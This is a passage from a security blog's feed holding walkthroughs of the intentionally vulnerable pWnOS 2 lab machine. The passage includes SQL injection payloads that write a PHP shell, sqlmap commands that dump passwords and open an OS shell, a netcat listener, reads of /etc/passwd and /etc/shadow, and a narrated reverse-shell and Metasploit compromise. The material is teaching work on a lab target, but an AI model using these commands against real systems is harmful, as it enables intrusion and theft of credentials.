&lt;/span&gt;&lt;span class="line"&gt;cat evil2.php &lt;span class="p"&gt;|&lt;/span&gt; xxd -ps &lt;span class="p"&gt;|&lt;/span&gt; tr -d &lt;span class="s1"&gt;'&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="s1"&gt;'&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;// &lt;span class="s1"&gt;' UNION SELECT null,null,,null,(0x),null,,null,null null INTO DUMPFILE &amp;quot;/var/www/evil2.php&amp;quot;-- -&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="s1"&gt;nc -lvp 1234&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="s1"&gt;curl --silent 10.10.10.100/evil2.php&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="s1"&gt;# // '&lt;/span&gt; UNION SELECT 1,2,3,@@plugin_dir,5,6,7,8-- &lt;span class="c"&gt;#/usr/lib/mysql/plugin&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="c"&gt;#cd /pentest/exploits/exploitdb/&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="c"&gt;#grep -i &amp;quot;udf&amp;quot; files.csv&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="c"&gt;#cat platforms/linux/local/7856.txt&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="c"&gt;#dhclient eth0&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="c"&gt;#wget http://exploit-db.com/sploits/2009-lib_mysqludf_sys_0.0.3.tar.gz -O /tmp/mysql.tar.gz&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="c"&gt;#!if&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="c"&gt;#ex mysql.tar.gz #tar zxvf mysql.tar.gz&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="c"&gt;#cd lib_mysqludf_sys/&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="c"&gt;#ll&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="c"&gt;#cat install.sh&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="c"&gt;#apt-get install libmysqlclient15-dev&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="c"&gt;#make&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;// firefox -&amp;gt; tools -&amp;gt; tamper data
&lt;/span&gt;&lt;span class="line"&gt;// firefox -&amp;gt; login -&amp;gt; username: &lt;span class="err"&gt;'&lt;/span&gt; or &lt;span class="nv"&gt;1&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt; - --, password: 123
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="nb"&gt;cd&lt;/span&gt; /pentest/database/sqlmap/
&lt;/span&gt;&lt;span class="line"&gt;./sqlmap.py
&lt;/span&gt;&lt;span class="line"&gt;./sqlmap.py -u http://10.10.10.100/login.php --data &lt;span class="s2"&gt;&amp;quot;email=g0tmi1k@internet.co.uk&amp;amp;pass=123&amp;amp;submit=Login&amp;amp;submitted=TRUE&amp;quot;&lt;/span&gt; -p &lt;span class="s2"&gt;&amp;quot;email&amp;quot;&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;./sqlmap.py -u http://10.10.10.100/login.php --data &lt;span class="s2"&gt;&amp;quot;email=g0tmi1k@internet.co.uk&amp;amp;pass=123&amp;amp;submit=Login&amp;amp;submitted=TRUE&amp;quot;&lt;/span&gt; -p &lt;span class="s2"&gt;&amp;quot;email&amp;quot;&lt;/span&gt; --fingerprint --banner --current-user --current-db --is-dba
&lt;/span&gt;&lt;span class="line"&gt;./sqlmap.py -u http://10.10.10.100/login.php --data &lt;span class="s2"&gt;&amp;quot;email=g0tmi1k@internet.co.uk&amp;amp;pass=123&amp;amp;submit=Login&amp;amp;submitted=TRUE&amp;quot;&lt;/span&gt; -p &lt;span class="s2"&gt;&amp;quot;email&amp;quot;&lt;/span&gt; -v &lt;span class="m"&gt;0&lt;/span&gt; --batch --users --passwords
&lt;/span&gt;&lt;span class="line"&gt;./sqlmap.py -u http://10.10.10.100/login.php --data &lt;span class="s2"&gt;&amp;quot;email=g0tmi1k@internet.co.uk&amp;amp;pass=123&amp;amp;submit=Login&amp;amp;submitted=TRUE&amp;quot;&lt;/span&gt; -p &lt;span class="s2"&gt;&amp;quot;email&amp;quot;&lt;/span&gt; -v &lt;span class="m"&gt;6&lt;/span&gt; --dbs
&lt;/span&gt;&lt;span class="line"&gt;./sqlmap.py -u http://10.10.10.100/login.php --data &lt;span class="s2"&gt;&amp;quot;email=g0tmi1k@internet.co.uk&amp;amp;pass=123&amp;amp;submit=Login&amp;amp;submitted=TRUE&amp;quot;&lt;/span&gt; -p &lt;span class="s2"&gt;&amp;quot;email&amp;quot;&lt;/span&gt; -v &lt;span class="m"&gt;0&lt;/span&gt; -D ch16 --tables
&lt;/span&gt;&lt;span class="line"&gt;./sqlmap.py -u http://10.10.10.100/login.php --data &lt;span class="s2"&gt;&amp;quot;email=g0tmi1k@internet.co.uk&amp;amp;pass=123&amp;amp;submit=Login&amp;amp;submitted=TRUE&amp;quot;&lt;/span&gt; -p &lt;span class="s2"&gt;&amp;quot;email&amp;quot;&lt;/span&gt; -v &lt;span class="m"&gt;0&lt;/span&gt; -D ch16 --columns --count
&lt;/span&gt;&lt;span class="line"&gt;./sqlmap.py -u http://10.10.10.100/login.php --data &lt;span class="s2"&gt;&amp;quot;email=g0tmi1k@internet.co.uk&amp;amp;pass=123&amp;amp;submit=Login&amp;amp;submitted=TRUE&amp;quot;&lt;/span&gt; -p &lt;span class="s2"&gt;&amp;quot;email&amp;quot;&lt;/span&gt; -v &lt;span class="m"&gt;0&lt;/span&gt; --batch -D ch16 --dump
&lt;/span&gt;&lt;span class="line"&gt;./sqlmap.py -u http://10.10.10.100/login.php --data &lt;span class="s2"&gt;&amp;quot;email=g0tmi1k@internet.co.uk&amp;amp;pass=123&amp;amp;submit=Login&amp;amp;submitted=TRUE&amp;quot;&lt;/span&gt; -p &lt;span class="s2"&gt;&amp;quot;email&amp;quot;&lt;/span&gt; -v &lt;span class="m"&gt;0&lt;/span&gt; --batch --sql-shell &lt;span class="c"&gt;# select * from users&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;./sqlmap.py -u http://10.10.10.100/login.php --data &lt;span class="s2"&gt;&amp;quot;email=g0tmi1k@internet.co.uk&amp;amp;pass=123&amp;amp;submit=Login&amp;amp;submitted=TRUE&amp;quot;&lt;/span&gt; -p &lt;span class="s2"&gt;&amp;quot;email&amp;quot;&lt;/span&gt; -v &lt;span class="m"&gt;0&lt;/span&gt; --batch --file-read&lt;span class="o"&gt;=&lt;/span&gt;/etc/passwd
&lt;/span&gt;&lt;span class="line"&gt;cat /pentest/database/sqlmap/output/10.10.10.100/files/_etc_passwd
&lt;/span&gt;&lt;span class="line"&gt;./sqlmap.py -u http://10.10.10.100/login.php --data &lt;span class="s2"&gt;&amp;quot;email=g0tmi1k@internet.co.uk&amp;amp;pass=123&amp;amp;submit=Login&amp;amp;submitted=TRUE&amp;quot;&lt;/span&gt; -p &lt;span class="s2"&gt;&amp;quot;email&amp;quot;&lt;/span&gt; -v &lt;span class="m"&gt;0&lt;/span&gt; --batch --os-shell
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;id
&lt;/span&gt;&lt;span class="line"&gt;uname -a
&lt;/span&gt;&lt;span class="line"&gt;hostname
&lt;/span&gt;&lt;span class="line"&gt;cat /etc/hosts
&lt;/span&gt;&lt;span class="line"&gt;netstat -antupx
&lt;/span&gt;&lt;span class="line"&gt;ps aux
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="nb"&gt;pwd&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;ls -lah /var/www
&lt;/span&gt;&lt;span class="line"&gt;cat /var/www/mysqli_connect.php
&lt;/span&gt;&lt;span class="line"&gt;cat /etc/ssh/sshd_config
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="nb"&gt;exit&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;ssh root@10.10.10.100 &lt;span class="c"&gt;#root@ISIntS&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;id&lt;span class="p"&gt;;&lt;/span&gt; uname -a&lt;span class="p"&gt;;&lt;/span&gt; ifconfig -a&lt;span class="p"&gt;;&lt;/span&gt; cat /etc/shadow&lt;span class="p"&gt;;&lt;/span&gt; ls -lahR ~/
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;/figure&gt;


&lt;a name="Notes"&gt;&lt;/a&gt;
&lt;h2&gt;Notes&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;Camtasia Studio has few issues, for example; when rendering highlighted boxes, they are produced unevenly as well as inserting a few black frames in random places. There is nothing I can do about this for the moment and I will re-render it at a later date when there has been an update.&lt;/li&gt;
&lt;li&gt;The readme file, says this is a "pre-release" (which came out in 2011-07-04).&lt;/li&gt;
&lt;li&gt;The log files (*_history, /var/log/apache2/*, etc) haven't been wiped from the VM before releasing.&lt;/li&gt;
&lt;li&gt;"Interesting" value in the VM's CD path.&lt;/li&gt;
&lt;/ul&gt;


&lt;p&gt;Songs: &lt;a href="http://itunes.apple.com/gb/album/hospitality-festival-drum/id441421682"&gt;Netsky - The Lotus Symphony&lt;/a&gt; &amp;amp; &lt;a href="http://itunes.apple.com/us/album/netsky/id372781750"&gt;Netsky - Secret Agent&lt;/a&gt; &amp;amp; &lt;a href="http://itunes.apple.com/us/album/everyday-come-back-home/id334403845"&gt;Netsky - Come Back Home&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Video length: 15:53&lt;/p&gt;

&lt;p&gt;Capture length: 59:01&lt;/p&gt;

&lt;p&gt;Blog Post: &lt;a href="https://blog.g0tmi1k.com/2012/09/pwnos-2-sql-injection/"&gt;https://blog.g0tmi1k.com/2012/09/pwnos-2-sql-injection/&lt;/a&gt;&lt;/p&gt;</description><pubDate>Wed, 19 Sep 2012 00:38:00 +0000</pubDate></item><item><title>pWnOS 2 (PHP Web Application)</title><link>https://blog.g0tmi1k.com/2012/09/pwnos-2-php-web-application/</link><description>&lt;p&gt;This is the second release in the "&lt;a href="https://blog.g0tmi1k.com/categories/pwnos/"&gt;pWnOS&lt;/a&gt;" &lt;a href="https://blog.g0tmi1k.com/2011/03/vulnerable-by-design/"&gt;vulnerable machine&lt;/a&gt; collection, however, it has a different creator from the previous one (which explains why it has a different "feel" to it). As always with "&lt;a href="https://blog.g0tmi1k.com/categories/boot2root/"&gt;boot2root&lt;/a&gt;" machines, it has purposely built "issues" allowing for the machine to become compromised, with the end goal being to become the super user, "root". This method uses a vulnerability in a PHP web application (see &lt;a href="https://blog.g0tmi1k.com/2012/09/pwnos-2-sql-injection/"&gt;here&lt;/a&gt; for exploiting via SQL injection).&lt;/p&gt;

&lt;p&gt;&lt;img alt="pwnOS Logo" class="center" height="105" src="https://blog.g0tmi1k.com/images/pwnos2.png" title="pwnOS2" width="469" /&gt;&lt;/p&gt;

&lt;!--more--&gt;




&lt;div id="tocBlock"&gt;
&lt;span class="tocHeading"&gt;Table of Contents&lt;/span&gt;
&lt;ul&gt;
 &lt;li&gt;
 &lt;ul&gt;
  &lt;li&gt;&lt;a href="https://blog.g0tmi1k.com/atom.xml#Links"&gt;Links&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href="https://blog.g0tmi1k.com/atom.xml#Method"&gt;Method&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href="https://blog.g0tmi1k.com/atom.xml#Tools"&gt;Tools&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href="https://blog.g0tmi1k.com/atom.xml#Walkthrough"&gt;Walkthrough&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href="https://blog.g0tmi1k.com/atom.xml#Commands"&gt;Commands&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href="https://blog.g0tmi1k.com/atom.xml#Notes"&gt;Notes&lt;/a&gt;&lt;/li&gt;
 &lt;/ul&gt;
 &lt;/li&gt;
&lt;/ul&gt;


&lt;/div&gt;


&lt;a name="Links"&gt;&lt;/a&gt;
&lt;h2&gt;Links&lt;/h2&gt;

&lt;p&gt;Watch video on-line: &lt;video controls="controls" height="432" poster="https://blog.g0tmi1k.com/atom.xml" preload="none" width="576"&gt;&lt;source src="http://download.g0tmi1k.com/videos_archive/pWnOS_2_%28PHP%29.mp4" /&gt;&lt;/video&gt;&lt;/p&gt;

&lt;p&gt;Download video: &lt;a href="http://download.g0tmi1k.com/videos_archive/pWnOS_2_%28PHP%29.mp4"&gt;http://download.g0tmi1k.com/videos_archive/pWnOS_2_(PHP).mp4&lt;/a&gt;&lt;/p&gt;

&lt;a name="Method"&gt;&lt;/a&gt;
&lt;h2&gt;Method&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;Scanned the network to discover the target [Net Discover]&lt;/li&gt;
&lt;li&gt;Port scanned the target to determine the running services on the target [Unicorn Scan]&lt;/li&gt;
&lt;li&gt;Emulated the services by grabbing the banner/header of the running service(s) [NMap]&lt;/li&gt;
&lt;li&gt;Discovered a hidden web application [DirB]&lt;/li&gt;
&lt;li&gt;Located a public exploit for the out dated web application [Exploit-DB]&lt;/li&gt;
&lt;li&gt;Created an additional user that uploaded a PHP shell onto the target to gain remote command access into the system [Pentest Monkey PHP Shell]&lt;/li&gt;
&lt;li&gt;Automated the same attack [Metasploit]&lt;/li&gt;
&lt;li&gt;Located hard coded plain text credentials, which had been re-used, allowing for complete system access&lt;/li&gt;
&lt;/ul&gt;


&lt;a name="Tools"&gt;&lt;/a&gt;
&lt;h2&gt;Tools&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href="http://pwnos.com/files/pWnOS_v2.0.7z"&gt;pWnOS_v2.0.7z&lt;/a&gt; &lt;em&gt;(md5: 1eb0960c0ba29335230ada1df80cd22c)&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;A virtual machine &lt;em&gt;(Example: &lt;a href="http://www.filehippo.com/download_vmware_player/"&gt;VMware Player&lt;/a&gt; or &lt;a href="http://www.filehippo.com/download_virtualbox/"&gt;Virtual Box&lt;/a&gt;)&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://nixgeneration.com/~jaime/netdiscover/"&gt;Net Discover&lt;/a&gt; - &lt;em&gt;(Can be found in &lt;a href="http://www.backtrack-linux.org/downloads/"&gt;BackTrack 5&lt;/a&gt;)&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.unicornscan.org/"&gt;Unicorn Scan&lt;/a&gt; - &lt;em&gt;(Can be found in BackTrack 5)&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://nmap.org/"&gt;NMap&lt;/a&gt; - &lt;em&gt;(Can be found in BackTrack 5)&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.mozilla.org/firefox/new/"&gt;Firefox&lt;/a&gt; - &lt;em&gt;(Can be found in BackTrack 5)&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://curl.haxx.se/"&gt;cURL&lt;/a&gt; - &lt;em&gt;(Can be found in BackTrack 5)&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.exploit-db.com/exploits/1191/"&gt;Simple PHP Blog &amp;lt;= 0.4.0 Multiple Remote Exploits&lt;/a&gt; - &lt;em&gt;(Can be found in BackTrack 5)&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://pentestmonkey.net/tools/web-shells/php-reverse-shell"&gt;php-reverse-shell&lt;/a&gt; - &lt;em&gt;(Can be found in BackTrack 5)&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://netcat.sourceforge.net/"&gt;Netcat&lt;/a&gt; - &lt;em&gt;(Can be found in BackTrack 5)&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.metasploit.com/download/"&gt;Metasploit&lt;/a&gt; - &lt;em&gt;(Can be found in BackTrack 5)&lt;/em&gt;&lt;/li&gt;
&lt;/ul&gt;


&lt;a name="Walkthrough"&gt;&lt;/a&gt;
&lt;h2&gt;Walkthrough&lt;/h2&gt;

&lt;p&gt;By reading the readme file, "pWnOS_INFO-2_0.txt", the attacker soon learns not only the IP range which the target is using, they also now know the target's network configuration &lt;em&gt;(it's using a static IP address of 10.10.10.100/24)&lt;/em&gt;. The attacker confirms the given information, by sweeping the network range with "net discover", which only displays a single result that matches the specified IP from the readme file.&lt;/p&gt;

&lt;p&gt;As soon as the attacker has updated their IP address to fit inside the target's subnet range, they try to discover what services the target is running. "Unicorn Scan" is able to quickly scan every port, both TCP and UDP, which belongs to the target. This shows that port TCP 22 &lt;em&gt;(SSH)&lt;/em&gt; &amp;amp; TCP 80 &lt;em&gt;(HTTP)&lt;/em&gt; are open. To verify the result, the attacker repeats port scanning all TCP ports with "nmap". An additional feature of nmap is its inbuilt scripting engine, which can emulate the services during the scan. This produces more relevant information about the target. Nmap confirms the same ports are open and which default port's numbers are used for their default services &lt;em&gt;(for example, SSH service on port TCP 22 and a web server running on TCP 80)&lt;/em&gt;. As SSH services are normally used to remotely execute commands, and due to their nature they normally require a form of authentication before access to the service is granted. This leaves the attacker to start with the web service.&lt;/p&gt;

&lt;p&gt;When the attacker visits the default web application with "Firefox" to graphically render the code, they are presented a form to fill in to which leads to further access to use the web application. After navigating around the site, they only discover three pages: the login form, a place to register in order to be able to login, and a home page. The home page contains an email address, "admin@isints.com". This could mean "admin" is a possible username &lt;em&gt;(which is very common)&lt;/em&gt;, and the domain the target is connected to.&lt;/p&gt;

&lt;p&gt;The attacker then starts to brute force various possible folders &amp;amp; filenames for common paths relating to web services by using "dirb". This displays three "interesting" results, "/includes", "/info", and "/blog". "/includes" contains pages relating to the source code, which are repeated throughout the web application &lt;em&gt;(for example, the header and footer)&lt;/em&gt;. When they looked at the code, the attacker is able to see the PHP code as the file extensions is ".html" and the web server isn't configured to process this file extension as server side code. "/info" is a page to show the output of "&lt;a href="http://php.net/manual/en/function.phpinfo.php"&gt;phpinfo()&lt;/a&gt;".
&lt;em&gt;(Editor's note: This file contains lots of useful information which would benefit the attacker as they would be able to understand the configuration of PHP on the system. However, I chose not to use this as a source of information, as this wasn't part of the vulnerable web application)&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;After the attacker visits the URI of "/blog", they discover it has a hidden web application, which is meant for internal use for the company, "isints". By clicking around, they try to see if they can locate any private internal data which they can use to their advantage, however, they didn't notice anything. The attacker believes this wasn't a bespoke custom application like before, so they try to identify what application and its version. Upon viewing the home page source code, they discover it is "Simple PHP Blog 0.4".&lt;/p&gt;

&lt;p&gt;The attacker re-runs dirb, however uses /blog as the default path, to see if there is any more hidden material located inside the application. This time, the attacker notices an "interesting" folder name, "/config". Using firefox they navigate to the folder and find it contains two files, "config.txt" and "password.txt". They both hold information which relates to their filename and the attacker downloads them both for an offline copy, in case they might be needed later.&lt;/p&gt;

&lt;p&gt;The attacker takes their knowledge of the hidden web application and searches a public database of known exploits provided by "exploit-db" &lt;em&gt;(to see if they are able to exploit the target's web application and version, simple php blog v0.4)&lt;/em&gt;. They find six exploits which match simple php blog and of those results, one result matches the target's version. After checking the exploit code will run, as sometimes there are additional values added at the start of the file that would means the file isn't correctly executed, the attacker runs the exploit code. The code presents a help screen that shows which command line arguments are required, for what function, as the supports multiple exploit.&lt;/p&gt;

&lt;p&gt;The attacker starts the exploit code to display the hashes on the system, which they have already acquired. This allows for the attacker to see if they are issuing the commands correctly into the exploit. The response from the exploit shows the hashes match the same value that the attacker discovered when they used dirb.&lt;/p&gt;

&lt;p&gt;Next they add another user into the web application with a username and password of their choosing. After the exploit has successfully ran, the attacker logs into the blog by using firefox and the credentials which they set. The attacker has now been granted additional features, of which, one is the ability to upload files. This feature is meant for images only, however, the attacker opts to try and use "Pentest Monkey's PHP reserve shell", and see if it is disallowed &lt;em&gt;(as it's not a valid image)&lt;/em&gt;. After making a copy of the shell, updating it so it contains the attackers IP address, they then try and upload the shell. The blog forwards them back to the homepage and doesn't give any feedback if the upload was successful or if it failed. When dirb was scanned the /blog/ folder, it displayed the server contained a folder called "/images". As the attacker attempted to upload an image, they navigated to the folder. They discover that the upload appeared to be successful as there is a matching filename and size displayed. The attacker can test to see if the upload really was successful by running the shell. For the shell to correctly work there needs to be a listener waiting on the IP address and port which it was configured with. The attacker used their IP address, so they set up "netcat" locally to listen on TCP port "1234" to match the shell. Now when someone "views" the shell page on the target web server, it causes the PHP code to be executed, creating a connection from the target to the attacker, then afterwards execute a shell program to be interacted with. The result being the attacker has gained an interact shell on the target, allowing them to execute commands remotely.&lt;/p&gt;

&lt;p&gt;The attacker goes back to the exploit code and tries to see if that is able to automate gaining a shell as it is one of the payload options. However, it partly fails, but it still creates a new file on the target machine that allows for commands to be executed and displayed. The attacker tests out the automated backdoor, and issues a command to display the current user. The result shows they are able to issue commands on the system, as the web server.&lt;/p&gt;

&lt;p&gt;The attacker goes back to their original shell as it is more interactive. They try to see if they are able to "upgrade" the newer shell, by using netcat. They find that it is installed on the system. However, the version which is installed, "OpenBSD", is not compatible with what they are trying at achieve as it doesn't support the "-e" argument, which allows for a program to be executed once a connection has been established, thus they are unable to upgrade it to an interactive shell using this method. They could however see if &lt;a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet"&gt;Perl, Python or Ruby&lt;/a&gt; is installed on the target and see if they could cause an improved shell. The attacker isn't worried about this as they already have an interactive shell via PHP.&lt;/p&gt;

&lt;p&gt;&lt;em&gt;(Editor's note: The stage below is optional as they are a repeat of the method above, however, it is included as it automates the attack as well as being more stable).&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;The attacker then repeats exploiting the target, using the same vulnerability, however this time uses "metasploit" as it is able to automate various aspects of the exploitation stage. After starting up a metasploit console, they search to see if the exploit has been ported and included within the framework. Whereas exploit-db returned six exploits for simple php blog, metasploit only has one. However, this matches the same exploit as before &lt;em&gt;(as it uses the same vulnerabilities)&lt;/em&gt;. After setting up the environment for the exploit to be executed in &lt;em&gt;(target's IP, path of the blog on the web server, payload to use, attacker's IP address &amp;amp; port)&lt;/em&gt;, the attacker commands metasploit to trigger the exploit. After waiting for the exploit to complete &lt;em&gt;(Editor's note: took about 30 seconds)&lt;/em&gt;, the attacker now has a meterpeter shell on the target's machine. They then execute a few basic in-built commands &lt;em&gt;(system information, current user and running processors)&lt;/em&gt; to meterpeter that starts emulating the target's operating system.&lt;/p&gt;

&lt;p&gt;The attacker places the current session into the background, as they wish to keep exploring metasploit features and modules. They then list all the current inbuilt exploits which when used locally can gain privileges, however, the ones currently in-built to metasploit the target isn't vulnerable to. Next they search post exploitable modules, which are designed to be executed once the attacker has a remote shell on the box. They start off looking at modules designed for just Linux systems, then modules which are able to be executed across different platforms. The attacker chooses to try out "&lt;a href="http://metasploit.com/modules/post/multi/general/execute"&gt;system_sessions&lt;/a&gt;", which has a similar effect to what they were trying to manually do with netcat, causing another remote interactive shell. After checking to make sure all the options match the attacker's requirements, they make a listener, ready to catch the connection. Then they run the module. The result, the attacker now has three interactive shells on the system &lt;em&gt;(as well as another method to execute commands)&lt;/em&gt;, all using the same vulnerability.&lt;/p&gt;

&lt;p&gt;The attacker goes back to the meterpeter shell on the target, and starts collecting information that might be useful and may aid them in discovering a method to escape privileges. To start with, they discover basic information relating to the operating system, such as: which user they are currently using &lt;em&gt;(along with the user's group value)&lt;/em&gt;, various information relating to the kernel &lt;em&gt;(name, hostname, release, version, hardware name, processor type, hardware platform and operating system)&lt;/em&gt; and hostnames. Next they identify what operating system the target is using and its version. Afterwards they move onto what's currently happening on the target regarding current network connections and running processors. After that, they start to explore the target's file system and soon learn the current path they are in, what files exist in the web root folder and what files are in "/var" &lt;em&gt;("Normally" it's used for files which are "meant" to be changed when the operating system is generally running)&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;Upon searching the filenames located on the target, the attacker saw an "interesting" filename, that was duplicated in the web folder and /var folders. They view the contents of the file; finding the file is used by the web server to interact with the database as the file has hard coded clear text credentials in it. However, the password values differ between the files.&lt;/p&gt;

&lt;p&gt;From the port scan at the beginning and when they emulate the target &lt;em&gt;(by its network activity and running processors)&lt;/em&gt;, the attacker knows there is a SSH service running which allows for remote access into the system. By viewing the configuration of the SSH service they discover that "root" login is enabled. The username "root" matches the username inside the database files, so the attacker tries to SSH into the box using root as the username. They then match up the rest of the credentials from the database configuration with the password. The web root folder password fails, however, the password from /var, allows them to gain access into the system as the super user, root.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Game Over&lt;/strong&gt;&lt;/p&gt;

&lt;a name="Commands"&gt;&lt;/a&gt;
&lt;h2&gt;Commands&lt;/h2&gt;

&lt;figure class="code"&gt;&lt;figcaption&gt;&lt;span&gt;&lt;/span&gt;&lt;/figcaption&gt;&lt;div class="highlight"&gt;&lt;table&gt;&lt;tr&gt;&lt;td class="gutter"&gt;&lt;pre class="line-numbers"&gt;&lt;span class="line-number"&gt;1&lt;/span&gt;
&lt;span class="line-number"&gt;2&lt;/span&gt;
&lt;span class="line-number"&gt;3&lt;/span&gt;
&lt;span class="line-number"&gt;4&lt;/span&gt;
&lt;span class="line-number"&gt;5&lt;/span&gt;
&lt;span class="line-number"&gt;6&lt;/span&gt;
&lt;span class="line-number"&gt;7&lt;/span&gt;
&lt;span class="line-number"&gt;8&lt;/span&gt;
&lt;span class="line-number"&gt;9&lt;/span&gt;
&lt;span class="line-number"&gt;10&lt;/span&gt;
&lt;span class="line-number"&gt;11&lt;/span&gt;
&lt;span class="line-number"&gt;12&lt;/span&gt;
&lt;span class="line-number"&gt;13&lt;/span&gt;
&lt;span class="line-number"&gt;14&lt;/span&gt;
&lt;span class="line-number"&gt;15&lt;/span&gt;
&lt;span class="line-number"&gt;16&lt;/span&gt;
&lt;span class="line-number"&gt;17&lt;/span&gt;
&lt;span class="line-number"&gt;18&lt;/span&gt;
&lt;span class="line-number"&gt;19&lt;/span&gt;
&lt;span class="line-number"&gt;20&lt;/span&gt;
&lt;span class="line-number"&gt;21&lt;/span&gt;
&lt;span class="line-number"&gt;22&lt;/span&gt;
&lt;span class="line-number"&gt;23&lt;/span&gt;
&lt;span class="line-number"&gt;24&lt;/span&gt;
&lt;span class="line-number"&gt;25&lt;/span&gt;
&lt;span class="line-number"&gt;26&lt;/span&gt;
&lt;span class="line-number"&gt;27&lt;/span&gt;
&lt;span class="line-number"&gt;28&lt;/span&gt;
&lt;span class="line-number"&gt;29&lt;/span&gt;
&lt;span class="line-number"&gt;30&lt;/span&gt;
&lt;span class="line-number"&gt;31&lt;/span&gt;
&lt;span class="line-number"&gt;32&lt;/span&gt;
&lt;span class="line-number"&gt;33&lt;/span&gt;
&lt;span class="line-number"&gt;34&lt;/span&gt;
&lt;span class="line-number"&gt;35&lt;/span&gt;
&lt;span class="line-number"&gt;36&lt;/span&gt;
&lt;span class="line-number"&gt;37&lt;/span&gt;
&lt;span class="line-number"&gt;38&lt;/span&gt;
&lt;span class="line-number"&gt;39&lt;/span&gt;
&lt;span class="line-number"&gt;40&lt;/span&gt;
&lt;span class="line-number"&gt;41&lt;/span&gt;
&lt;span class="line-number"&gt;42&lt;/span&gt;
&lt;span class="line-number"&gt;43&lt;/span&gt;
&lt;span class="line-number"&gt;44&lt;/span&gt;
&lt;span class="line-number"&gt;45&lt;/span&gt;
&lt;span class="line-number"&gt;46&lt;/span&gt;
&lt;span class="line-number"&gt;47&lt;/span&gt;
&lt;span class="line-number"&gt;48&lt;/span&gt;
&lt;span class="line-number"&gt;49&lt;/span&gt;
&lt;span class="line-number"&gt;50&lt;/span&gt;
&lt;span class="line-number"&gt;51&lt;/span&gt;
&lt;span class="line-number"&gt;52&lt;/span&gt;
&lt;span class="line-number"&gt;53&lt;/span&gt;
&lt;span class="line-number"&gt;54&lt;/span&gt;
&lt;span class="line-number"&gt;55&lt;/span&gt;
&lt;span class="line-number"&gt;56&lt;/span&gt;
&lt;span class="line-number"&gt;57&lt;/span&gt;
&lt;span class="line-number"&gt;58&lt;/span&gt;
&lt;span class="line-number"&gt;59&lt;/span&gt;
&lt;span class="line-number"&gt;60&lt;/span&gt;
&lt;span class="line-number"&gt;61&lt;/span&gt;
&lt;span class="line-number"&gt;62&lt;/span&gt;
&lt;span class="line-number"&gt;63&lt;/span&gt;
&lt;span class="line-number"&gt;64&lt;/span&gt;
&lt;span class="line-number"&gt;65&lt;/span&gt;
&lt;span class="line-number"&gt;66&lt;/span&gt;
&lt;span class="line-number"&gt;67&lt;/span&gt;
&lt;span class="line-number"&gt;68&lt;/span&gt;
&lt;span class="line-number"&gt;69&lt;/span&gt;
&lt;span class="line-number"&gt;70&lt;/span&gt;
&lt;span class="line-number"&gt;71&lt;/span&gt;
&lt;span class="line-number"&gt;72&lt;/span&gt;
&lt;span class="line-number"&gt;73&lt;/span&gt;
&lt;span class="line-number"&gt;74&lt;/span&gt;
&lt;span class="line-number"&gt;75&lt;/span&gt;
&lt;span class="line-number"&gt;76&lt;/span&gt;
